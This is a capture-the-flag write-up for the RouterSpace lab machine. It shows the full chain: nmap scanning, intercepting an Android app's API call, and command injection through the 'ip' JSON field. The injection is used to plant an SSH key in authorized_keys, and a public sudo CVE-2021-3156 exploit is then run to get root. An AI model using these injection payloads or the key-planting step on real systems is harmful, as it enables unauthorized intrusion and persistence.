# RouterSpace
```
Difficulty: Easy
Operating System: Linux
Hints: True
```

### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `paul` | Nmap, Code Analysis, Command Injection | An initial Nmap scan revealed ports 22 (SSH) and 80 (HTTP) were open. The web server on port 80 offered a downloadable `RouterSpace.apk` file. The APK was analyzed in an emulated Android environment (using Anbox and ADB) and was found to make a POST request to `/api/v4/monitoring/router/dev/check/deviceAccess` with a JSON payload containing an IP address. By intercepting this request with a proxy, a command injection vulnerability was identified in the `ip` parameter. |
| 2 | `paul` | SSH Key Injection, SSH Login | Exploited the command injection vulnerability to echo a public SSH key into the `authorized_keys` file for the `paul` user. This allowed for an SSH connection as `paul`, successfully bypassing a firewall that was blocking outbound reverse shell connections. |
| 3 | `root` | `linPEAS`, Sudo Vulnerability (CVE-2021-3156) | After gaining access as `paul`, a standard enumeration script (`linPEAS`) was run. The script identified that the `sudo` version `1.8.31` was vulnerable to CVE-2021-3156, a heap-based buffer overflow. A public exploit for this vulnerability was downloaded, compiled, and executed. This resulted in gaining a root shell. |
| 4 | `root` | Final Flag | Once a root shell was obtained, the final flag was retrieved. |


## Initial Enumeration
Running nmap scan (TCP) on the target shows the following results:
```
Nmap scan report for 10.10.11.148
Host is up (0.035s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
| ssh-hostkey:
|   3072 f4:e4:c8:0a:a6:af:66:93:af:69:5a:a9:bc:75:f9:0c (RSA)
|   256 7f:05:cd:8c:42:7b:a9:4a:b2:e6:35:2c:c4:59:78:02 (ECDSA)
|_  256 2f:d7:a8:8b:be:2d:10:b0:c9:b4:29:52:a8:94:24:78 (ED25519)
| fingerprint-strings:
|   NULL:
|_    SSH-2.0-RouterSpace Packet Filtering V1
80/tcp open  http
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-44322
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 75
|     ETag: W/"4b-ImLQdsgvmn46/VUlibmI4UAA4yY"
|     Date: Mon, 25 Apr 2022 20:07:16 GMT
|     Connection: close
|     Suspicious activity detected !!! {RequestID: f wL TjfzR P k ckal }
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-57326
|     Accept-Ranges: bytes
|     Cache-Control: public, max-age=0
|     Last-Modified: Mon, 22 Nov 2021 11:33:57 GMT
|     ETag: W/"652c-17d476c9285"
|     Content-Type: text/html; charset=UTF-8
|     Content-Length: 25900
|     Date: Mon, 25 Apr 2022 20:07:15 GMT
|     Connection: close
|     <!doctype html>
|     <html class="no-js" lang="zxx">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>RouterSpace</title>
|     <meta name="description" content="">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/owl.carousel.min.css">
|     <link rel="stylesheet" href="css/magnific-popup.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/themify-icons.css">
|   HTTPOptions:
|     HTTP/1.1 200 OK
|     X-Powered-By: RouterSpace
|     X-Cdn: RouterSpace-5636
|     Allow: GET,HEAD,POST
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 13
|     ETag: W/"d-bMedpZYGrVt1nR4x+qdNZ2GqyRo"
|     Date: Mon, 25 Apr 2022 20:07:16 GMT
|     Connection: close
|     GET,HEAD,POST
|   RTSPRequest, X11Probe:
|     HTTP/1.1 400 Bad Request
|_    Connection: close
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-title: RouterSpace
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port22-TCP:V=7.92%I=7%D=4/25%Time=6266FF73%P=x86_64-pc-linux-gnu%r(NULL
SF:,29,"SSH-2\.0-RouterSpace\x20Packet\x20Filtering\x20V1\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=4/25%Time=6266FF73%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\n
SF:X-Cdn:\x20RouterSpace-57326\r\nAccept-Ranges:\x20bytes\r\nCache-Control
SF::\x20public,\x20max-age=0\r\nLast-Modified:\x20Mon,\x2022\x20Nov\x20202
SF:1\x2011:33:57\x20GMT\r\nETag:\x20W/\"652c-17d476c9285\"\r\nContent-Type
SF::\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x2025900\r\nDate:\x
SF:20Mon,\x2025\x20Apr\x202022\x2020:07:15\x20GMT\r\nConnection:\x20close\
SF:r\n\r\n<!doctype\x20html>\n<html\x20class=\"no-js\"\x20lang=\"zxx\">\n<
SF:head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20<me
SF:ta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x20\x20\
SF:x20\x20<title>RouterSpace</title>\n\x20\x20\x20\x20<meta\x20name=\"desc
SF:ription\"\x20content=\"\">\n\x20\x20\x20\x20<meta\x20name=\"viewport\"\
SF:x20content=\"width=device-width,\x20initial-scale=1\">\n\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"css/bootstrap\.min\.css\">\n\x
SF:20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/owl\.carousel\.
SF:min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"css/
SF:magnific-popup\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20
SF:href=\"css/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"st
SF:ylesheet\"\x20href=\"css/themify-icons\.css\">\n\x20")%r(HTTPOptions,10
SF:7,"HTTP/1\.1\x20200\x20OK\r\nX-Powered-By:\x20RouterSpace\r\nX-Cdn:\x20
SF:RouterSpace-5636\r\nAllow:\x20GET,HEAD,POST\r\nContent-Type:\x20text/ht
SF:ml;\x20charset=utf-8\r\nContent-Length:\x2013\r\nETag:\x20W/\"d-bMedpZY
SF:GrVt1nR4x\+qdNZ2GqyRo\"\r\nDate:\x20Mon,\x2025\x20Apr\x202022\x2020:07:
SF:16\x20GMT\r\nConnection:\x20close\r\n\r\nGET,HEAD,POST")%r(RTSPRequest,
SF:2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n"
SF:)%r(X11Probe,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(FourOhFourRequest,131,"HTTP/1\.1\x20200\x20OK\r\nX-Pow
SF:ered-By:\x20RouterSpace\r\nX-Cdn:\x20RouterSpace-44322\r\nContent-Type:
SF:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2075\r\nETag:\x20W/
SF:\"4b-ImLQdsgvmn46/VUlibmI4UAA4yY\"\r\nDate:\x20Mon,\x2025\x20Apr\x20202
SF:2\x2020:07:16\x20GMT\r\nConnection:\x20close\r\n\r\nSuspicious\x20activ
SF:ity\x20detected\x20!!!\x20{RequestID:\x20f\x20wL\x20\x20TjfzR\x20P\x20\
SF:x20k\x20ckal\x20}\n\n\n\n\n\n\n");```
```
Besides the very long Nmap output, we can see that only port 80 and 22 are opened.  
As we dig into port 80 we can see that the site does not contain anything really relevant, except a download button that allows to download ```RouterSpace.apk```.
Now, we want to try to run the .apk file and see what it does and see if this contains a possible attack vector.  
To open the .apk file we need to install anbox on our kali and run the apk file. Since this has been by far not so easy, reporting below installation steps for future reference.  
To do so, first, we'll need to install snapd:
```
[root@kali RouterSpace ]$ apt install snapd
```
then we'll need to start snapd using systemd:
```
[root@kali RouterSpace ]$ systemctl start snapd
```
Once snap is started we can install anbox:  
```
[root@kali RouterSpace ]$ snap install --devmode --edge anbox
anbox (edge) 4+gitrad377ff from Simon Fels (morphis) installed
```
Anbox, essentially, is running android in a container hence it needs an os image to boot the OS.  
The Android containers are managed by ```anbox-container-manager.service```, if we check the status of this service we can see the following error message:  
```
[root@kali anbox ]$ systemctl status anbox-container-manager.service

○ anbox-container-manager.service - Anbox Container Manager
     Loaded: loaded (/lib/systemd/system/anbox-container-manager.service; disabled; vendor preset: disabled)
     Active: inactive (dead)
       Docs: man:anbox(1)

Apr 26 12:41:04 kali systemd[1]: Started Anbox Container Manager.
Apr 26 12:46:31 kali systemd[1]: Stopping Anbox Container Manager...
Apr 26 12:46:32 kali systemd[1]: anbox-container-manager.service: Deactivated successfully.
Apr 26 12:46:32 kali systemd[1]: Stopped Anbox Container Manager.
Apr 26 12:46:34 kali systemd[1]: Starting Anbox Container Manager...
Apr 26 12:46:34 kali systemd[1]: Started Anbox Container Manager.
Apr 26 15:47:08 kali systemd[1]: Stopping Anbox Container Manager...
Apr 26 15:47:08 kali systemd[1]: anbox-container-manager.service: Deactivated successfully.
Apr 26 15:47:08 kali systemd[1]: Stopped Anbox Container Manager.
Apr 26 15:47:15 kali systemd[1]: Anbox Container Manager was skipped because of a failed condition check (ConditionPathExists=/var/lib/anbox/android.img).
```
as we can see on the last line, ```anbox-container-manager.service``` is looking for an android.img file under ```/var/lib/anbox```. If we navigate to this directory we can see that we don't have any ```android.img``` file.  
A quick google search can allow us to find an [android.img file](https://build.anbox.io/android-images/2018/07/19/). now all we have to do is download this file and move it to our target directory:  
```
[root@kali anbox ]$ mv ~/Downloads/android_amd64.img /var/lib/anbox/android.img
```
Now we can start ```anbox-container-manager.service``` and we can see that it succesfully loads.
```
[root@kali anbox ]$ systemctl start anbox-container-manager.service          
[root@kali anbox ]$ systemctl status anbox-container-manager.service          

● anbox-container-manager.service - Anbox Container Manager
     Loaded: loaded (/lib/systemd/system/anbox-container-manager.service; disabled; vendor preset: disabled)
     Active: active (running) since Tue 2022-04-26 15:54:34 CEST; 3s ago
       Docs: man:anbox(1)
    Process: 19604 ExecStartPre=/sbin/modprobe ashmem_linux (code=exited, status=0/SUCCESS)
    Process: 19605 ExecStartPre=/sbin/modprobe binder_linux (code=exited, status=0/SUCCESS)
    Process: 19606 ExecStartPre=/usr/share/anbox/anbox-bridge.sh start (code=exited, status=0/SUCCESS)
   Main PID: 19630 (anbox)
      Tasks: 9 (limit: 6977)
     Memory: 2.6M
        CPU: 96ms
     CGroup: /system.slice/anbox-container-manager.service
             └─19630 /usr/bin/anbox container-manager --daemon --privileged --data-path=/var/lib/anbox

Apr 26 15:54:34 kali systemd[1]: Starting Anbox Container Manager...
Apr 26 15:54:34 kali systemd[1]: Started Anbox Container Manager.
```
Now we can start our container using:  
```
[root@kali ~ ]$ anbox session-manager      
libEGL warning: DRI2: failed to authenticate
```
This command does not automatically goes in background, hence we'll need to open a new terminal tab.  
once we have installed anbox and the container is running, we need to install a tool called ```adb``` that will allow us to install our custom .apk file in our newly created anbox android image.  
```
[root@kali anbox ]$ apt install adb
```
Now, after we installed ```adb``` we can install our ```RouterSpace.apk``` file.  
```
[root@kali RouterSpace ]$ adb install RouterSpace.apk  
Performing Streamed Install
Success
```
Now we can see RouterSpace installed by browsing our installed applications on kali (it runs as a normal application).  
Once we open the application we can see a single button: ```Check Status``` when we click on the button it gives a connection error message.  
Now, in order to dig deeper into this issue, let's try to set up a proxy for adb
```
[root@kali RouterSpace ]$ adb shell settings put global http_proxy 192.168.250.1:8081
```
The address used for the proxy is the "virtual gateway" for the anbox container, in order to beeing able to intercept request for this address we'll need to set up a new listener on burpsuite.  

## User
Now, as we can intercept requests, we can see the following request is performed by the application, against an API that is listening on port 80:  
```
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 16
Host: routerspace.htb
Connection: close
Accept-Encoding: gzip, deflate

{"ip":"0.0.0.0"}
```
As we can see the server responds echoing back 0.0.0.0:  
```
HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-64789
Content-Type: application/json; charset=utf-8
Content-Length: 11
ETag: W/"b-ANdgA/PInoUrpfEatjy5cxfJOCY"
Date: Tue, 26 Apr 2022 12:36:39 GMT
Connection: close

"0.0.0.0\n"
```
now guessing how this command execution on server side is crafted we can try different payloads:  
```
{"ip":"0.0.0.0; id"}
```
And the server responds with:  
```
"0.0.0.0\nuid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
```
Now we managed to get command execution, now, if we try to set up a remote shell, we cannot get back any connection; also pinging back our host and sniffing the traffic on tun0 with tcpdump doesn't show any result. As we will see later, this is due to an iptables firefall that is filtering out our connections. To workaround this, since ssh is opened, we can generate and drop an ssh key for paul user and log in:  
```
POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
accept: application/json, text/plain, */*
user-agent: RouterSpaceAgent
Content-Type: application/json
Content-Length: 634
Host: routerspace.htb
Connection: close
Accept-Encoding: gzip, deflate

{"ip":"hello; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDn57FBnyFxbWeOy0A2KLQINukgX8Hb/KRPVfpbrvfKviA3XrwDT8LarWDv0hBpj/ecy83x9JlsxEi8ZA6kYb3U0olD5v+5eOBnpINvyeWGvnOXDLiwZ0c9/RNPtHebOwVl1g7XQJWDW5m+oc31GrELs48O5OunGgemR1J2y88Ax33/Ys2VarF07zpWKPAsgMefAwSxyrhSgUCg0pJF8Hg9G65cf498+A/flc30pvtQvUej+Qf9eVptZ5cuYNtPKGYBJnaCr/f/TSW+04Of3MjQoYuwaWGrgyurEeU1+dArR8AAYxJYnQqLGY5SqZZ2ljz+npJ6FSwrOmntQ+s9xMb+KmS/78hnug1P3iBNJOzWKTHD1zxPjhWueBChh7RSVTGKObA+MlVBaqdF468C7WtRWasn8ikJcS6po97kfPU3VqhfNH/OUY5VNmbAiS1YhWRWrHmsL8TYiTJnAUgY58is6rJ6w7ECGczVw9PyVGI4hSa6kISMHT8ivOQ4uiggdsU=' > /home/paul/.ssh/authorized_keys;ls -la /home/paul/.ssh; "}
```
we get  
```
HTTP/1.1 200 OK
X-Powered-By: RouterSpace
X-Cdn: RouterSpace-82077
Content-Type: application/json; charset=utf-8
Content-Length: 166
ETag: W/"a6-YFUJv+6DrpdPOMmi9bfykozHdZY"
Date: Tue, 26 Apr 2022 14:19:59 GMT
Connection: close

"hello\ntotal 12\ndrwx------ 2 paul paul 4096 Apr 26 13:02 .\ndrwxr-xr-x 9 paul paul 4096 Apr 26 13:21 ..\n-rw-r--r-- 1 paul paul  553 Apr 26 14:19 authorized_keys\n"
```
so we can assume that the file has been written.  
now let's try to log in:  
```
[root@kali RouterSpace ]$ ssh -l paul -i keys/id_rsa_paul $TARGET       
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 26 Apr 2022 02:21:21 PM UTC

  System load:           0.0
  Usage of /:            71.0% of 3.49GB
  Memory usage:          31%
  Swap usage:            0%
  Processes:             211
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.148
  IPv6 address for eth0: dead:beef::250:56ff:feb9:1af8

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

80 updates can be applied immediately.
31 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Apr 26 13:05:37 2022 from 10.10.14.17
-bash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)
paul@routerspace:~$
```

## Root
Once we log in, following our standard approach, we can run linPEAS looking for possible privilege escalation vectors.    
After we run linPEAS, we can notice that a vulnerable version of sudo is running:  
```
╔══════════╣ Sudo version                                                                                             
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                            
Sudo version 1.8.31   
```
Googling around for sudo exploits, we can find [this source](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit) that seems to suit our possible privilege escalation vector.  
Now, let's download the sources, pack them in a .tar.gz archive and send the archive over scp.  
```
[root@kali exploits ]$ scp -i ../keys/id_rsa_paul expl.tar.gz paul@$TARGET:   
expl.tar.gz                                                                                                                                                                                                100%   15KB 169.8KB/s   00:00
```
Once we've sent the archive, we can follow the instructions on the git repo, compile the sources and execute the exploit:
```
paul@routerspace:~$ cd Sudo-1.8.31-Root-Exploit/
paul@routerspace:~/Sudo-1.8.31-Root-Exploit$ make
mkdir libnss_x
cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c
cc -O3 -o exploit exploit.c
paul@routerspace:~/Sudo-1.8.31-Root-Exploit$ ./exploit
# id
uid=0(root) gid=0(root) groups=0(root),1001(paul)
```
and we gained root on this box.  
